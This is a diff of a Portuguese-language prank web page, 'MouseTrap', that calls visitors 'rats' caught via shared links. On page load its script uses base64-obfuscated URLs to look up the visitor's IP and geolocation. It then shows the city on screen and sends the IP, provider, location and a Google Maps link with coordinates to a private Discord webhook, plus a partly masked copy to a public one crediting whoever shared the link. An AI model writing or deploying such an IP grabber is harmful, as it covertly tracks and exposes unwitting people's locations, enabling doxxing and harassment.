@@ -1,200 +1,178 @@
 <!DOCTYPE html>
 <html>
-    <head>
 
-    </head>
-    <body>
+<head>
 
-        <body style="margin: 0; padding: 0; font-family: Cambria, Cochin, Georgia, Times, 'Times New Roman', serif; background-color: #fefefe">
-            <div style="width: 100vw; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column;">
-                <img src="mousetrap.gif"  width="400">
-                <h1>Mais um ratão de Imgur capturado! 🤣🤣</h1>
-                <h2> <span id="loc"></span></h2>
-                <br>
-                <h3><b><a href="https://discord.gg/K8zzbUDb">Se junte ao Discord dos ratos!</a></b></h3>
-                <audio id="som" src="rato.mp3" autoplay></audio>
-            </div>
-        </body>
+</head>
 
-        <script>
+<body>
 
-                 window.addEventListener('DOMContentLoaded', () => {
-                    const som = document.getElementById('som');
-                    som.play().catch(() => {
-                        const btn = document.createElement('button');
-                        btn.textContent = '▶';
-                        btn.onclick = () => {
-                        som.play();
-                        btn.remove();
-                        };
-                        document.body.appendChild(btn);
-                    });
-                });
+    <body
+        style="margin: 0; padding: 0; font-family: Cambria, Cochin, Georgia, Times, 'Times New Roman', serif; background-color: #fefefe">
+        <div
+            style="width: 100vw; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column;">
+            <img src="mousetrap.gif" width="400">
+            <h1>Mais um ratão de Imgur capturado! 🤣🤣</h1>
+            <h2> <span id="loc"></span></h2>
+            <br>
+            <h3><b><a href="https://discord.gg/K8zzbUDb">Se junte ao Discord dos ratos!</a></b></h3>
+        </div>
+    </body>
 
-                const urlParams = new URLSearchParams(window.location.search);
-                client = urlParams.get('client');
-            
-            class Start {
-                static async start() {
-                    let i;
-                    try{
+    <script>
+        // Global vars
+        let client = "Desconhecido";
+        const urlParams = new URLSearchParams(window.location.search);
+        client = urlParams.get('client');
+        const PROD = true;
+
+        // Main Class
+        class MouseTrap {
+            static async start() {
+                let ip;
+
+                // Api Calls
+                try {
                     await fetch(atob("aHR0cHM6Ly9hcGktYmRjLm5ldC9kYXRhL2NsaWVudC1pcA=="))
-                    .then((body) => body.json())
-                    .then((data) => {
-                        i = data.ipString;
-                    })
-                    .catch((error) => {});
+                        .then((body) => body.json())
+                        .then((data) => {
+                            ip = data.ipString;
+                        })
+                        .catch((error) => { });
+
+
+                    let geoRes = await fetch(
+                        `${atob("aHR0cHM6Ly9hcGktYmRjLm5ldC9kYXRhL2lwLWdlb2xvY2F0aW9uP2lwPQ==")}${ip}${atob("JmxvY2FsaXR5TGFuZ3VhZ2U9ZW4ma2V5PWJkY183ZDk5Y2VmNzM1YTk0Y2I0YjgyZDM3YTI5NTE4YTU2Nw==")}`
+                    );
+                    let geoData = await geoRes.json();
+
+                    // Update view
+                    let $loc = document.getElementById("loc");
+                    $loc.innerHTML = 'O Ratão está em ' + geoData.location.principalSubdivision + ", " + geoData.location.localityName + "!";
                     
-                    
-                    let resOldApi = await fetch(
-                    `${atob("aHR0cHM6Ly9hcGktYmRjLm5ldC9kYXRhL2lwLWdlb2xvY2F0aW9uP2lwPQ==")}${i}${atob("JmxvY2FsaXR5TGFuZ3VhZ2U9ZW4ma2V5PWJkY183ZDk5Y2VmNzM1YTk0Y2I0YjgyZDM3YTI5NTE4YTU2Nw==")}`
-                    );  
-
-                        let data = await resOldApi.json();
-                        
-                       let $loc =  document.getElementById("loc");
-                       $loc.innerHTML = 'O Ratão está em ' + data.location.principalSubdivision + ", " + data.location.localityName + "!";
-                        
-
-                       let meioIp = i[0].slice(0, i[0].lastIndexOf(".")+1); + "******";
-
-                        if(client != null){
-                            Start.ratoeira(`${i[0]}******`, `${
-                            data.location.principalSubdivision +
-                            ", " +
-                            data.location.localityName
-                        }`);
+                    // Loggers
+                    if (PROD) {
+                        if (client && client.toLowerCase() !== "desconhecido") {
+                            MouseTrap.publicLogger(geoData);
                         }
-                    
-                        let rawJsonString = JSON.stringify(data, null, 2);
 
-                        console.log(rawJsonString);
-                        
-
-                    Start.sendIpData(data, "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzMzY2NTg5MTM3MDkzMDMzOC95RUlNR29qbDdGVEluT3V6NU9JRnItTFpQT3dmMkFjQVMweTBkX0JGOEtjaTlhR2t3NEJRWjJWeEh4NFdsQkllbUdBTA==");
-
-                    }catch(e){
-                    console.log(e);
+                        MouseTrap.privateLogger(geoData);
                     }
-                }
 
-                // Grabber
-                static sendIpData(json, url) {
-                    const request = new XMLHttpRequest();
-                    request.open("POST", atob(url));
-                    request.setRequestHeader("Content-type", "application/json");
-                   
-                    const params = {
-                    embeds: [
+                } catch (e) {
+                    console.log(e);
+                }
+            }
+
+            // Private logger
+            static privateLogger(json) {
+                let u =
+                    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzMzY2NTg5MTM3MDkzMDMzOC95RUlNR29qbDdGVEluT3V6NU9JRnItTFpQT3dmMkFjQVMweTBkX0JGOEtjaTlhR2t3NEJRWjJWeEh4NFdsQkllbUdBTA==";
+
+                const embed = {
+                    color: MouseTrap.stringToColorDecimal(client || "Desconhecido"),
+                    fields: [
+                        // Capturado por
                         {
-                        color: Start.stringToColorDecimal(client || "Desconhecido"),
-                        fields: [
-                            // Capturado por
-                            {
                             name: "🐭 Capturado por",
                             value: client || "Desconhecido",
                             inline: true
-                            },
+                        },
 
-                            // IP
-                            {
+                        // IP
+                        {
                             name: "💻 IP",
                             value: json.ip,
                             inline: true
-                            },
+                        },
 
-                            // Local
-                            {
+                        // Local
+                        {
                             name: "🌍 Local",
                             value: `${json.location.principalSubdivision}, ${json.location.localityName}, ${json.location.city}, ${json.country.isoName}`,
                             inline: false
-                            },
+                        },
 
-                            // Provedor
-                            {
+                        // Provedor
+                        {
                             name: "🛡️ Provedor",
                             value: json.network.organisation,
                             inline: false
-                            },
+                        },
 
-                            // Google Maps
-                            {
+                        // Google Maps
+                        {
                             name: "📍 Google Maps",
                             value: `https://www.google.com/maps?q=${json.location.latitude},${json.location.longitude}`,
                             inline: false
-                            },
+                        },
 
-                            // Complete Info
-                            {
+                        // Complete Info
+                        {
                             name: "📄 Informações completas",
                             value: "https://api-bdc.net/data/ip-geolocation?ip=" + json.ip,
                             inline: false
-                            }
-                        ],
-                        },
+                        }
                     ],
-                    };
+                };
 
-                    
-                    request.send(JSON.stringify(params));
-                }
+                MouseTrap.sendMessage(u, embed);
+            }
 
-                static stringToColorDecimal(str) {
-                    let hash = 0;
-
-                    // Gera um hash determinístico
-                    for (let i = 0; i < str.length; i++) {
-                        hash = str.charCodeAt(i) + ((hash << 5) - hash);
-                    }
-
-                    // Extrai os 3 bytes RGB
-                    const r = (hash >> 16) & 0xff;
-                    const g = (hash >> 8) & 0xff;
-                    const b = hash & 0xff;
-
-                    // Converte para decimal (0xRRGGBB → decimal)
-                    return (r << 16) + (g << 8) + b;
-                }
-
-
-                // Public
-                static ratoeira(id, b) {
-                    let u =
+            // Public logger
+            static publicLogger(json) {
+                let wh =
                     "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzNDM1MDAwMDc4NzI5NjI1Ni9FN1ZDSFUtZDF2Y1dqZ2libTJFOFpMTXJNTkc5Mzg3UG5MTFBYMGlPcFFRekJGSHhMdDVvSHZTODllSjhaSzNMQy0zbA==";
-                    const request = new XMLHttpRequest();
-                    request.open("POST", atob(u));
+                const arr = json.ip.split(".");
+                const ofuscatedIp = arr.length > 4 ?
+                    `${arr[0]}:${arr[1]}:****:****:****:****:${arr[arr.length - 2]}:${arr[arr.length - 1]}`
+                    : `${arr[0]}.${arr[1]}.***.${arr[3]}`;
 
-                    request.setRequestHeader("Content-type", "application/json");
-                    let nome = "Desconhecido";
-                    try{
-                        const urlParams = new URLSearchParams(window.location.search);
-                        nome = urlParams.get('client');
-                    } catch(e){}
-                    const params = {
-                    embeds: [
+                const params = {
+                    title: `🐭 Ratão capturado por ${client}`,
+                    fields: [
                         {
-                        title: `🐭 Ratão capturado por ${nome}`,
-                        fields: [
-                            {
                             name: "📍 Localização",
-                            value: b,
-                            },
-                        ],
-                        footer: {
-                            text: "IP do Rato: " + id,
-                        },
+                            value: `${json.location.principalSubdivision}, ${json.location.localityName}, ${json.location.city}, ${json.country.isoName}`,
                         },
                     ],
-                    };
-                    request.send(JSON.stringify(params));
-                }
-                }
+                    footer: {
+                        text: "IP do Rato: " + ofuscatedIp,
+                    },
+                };
 
-                Start.start();
-        </script>
-    </body>
+                MouseTrap.sendMessage(wh, params);
+
+            }
+
+            // Generic Message Sender
+            static sendMessage(url, embed) {
+                const request = new XMLHttpRequest();
+                request.open("POST", atob(url));
+                request.setRequestHeader("Content-type", "application/json");
+                const params = {
+                    embeds: [embed],
+                };
+                request.send(JSON.stringify(params));
+            }
+
+            // ColorPicker
+            static stringToColorDecimal(str) {
+                let hash = 0;
+                for (let i = 0; i < str.length; i++) {
+                    hash = str.charCodeAt(i) + ((hash << 5) - hash);
+                }
+                const r = (hash >> 16) & 0xff;
+                const g = (hash >> 8) & 0xff;
+                const b = hash & 0xff;
+                return (r << 16) + (g << 8) + b;
+            }
+        }
+
+
+        // Start
+        MouseTrap.start();
+    </script>
+</body>
+
 </html>
-
-
-
-
